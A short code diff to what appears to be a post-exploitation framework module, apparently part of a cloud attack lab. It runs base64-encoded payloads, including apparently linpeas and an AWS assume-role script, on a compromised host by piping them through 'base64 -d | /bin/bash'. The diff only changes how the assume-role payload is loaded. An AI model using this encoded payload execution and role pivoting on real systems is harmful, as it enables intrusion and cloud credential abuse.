@@ -51,13 +51,8 @@ class Module(BaseModule):
                 result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'")
                 session.log(result)
 
-                # run a local assume role...not ideal
-                template = env.get_template('iam2rds_assumerole.sh')
-                output = template.render({
-                    'role_name' : '${iam2rds_role_name}' ,
-                    'session_name' : '${iam2rds_session_name}'
-                })
-                payload = base64.b64encode(output.encode('utf-8'))
+                # run a local assume role...not ideal but ensures local usage
+                payload = base64.b64encode(Path(f'{script_dir}/../resources/iam2rds_assumerole.sh').read_bytes())
                 session.log("payload loaded and ready")
                 result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_assumerole | base64 -d | /bin/bash'")
                 session.log(result)
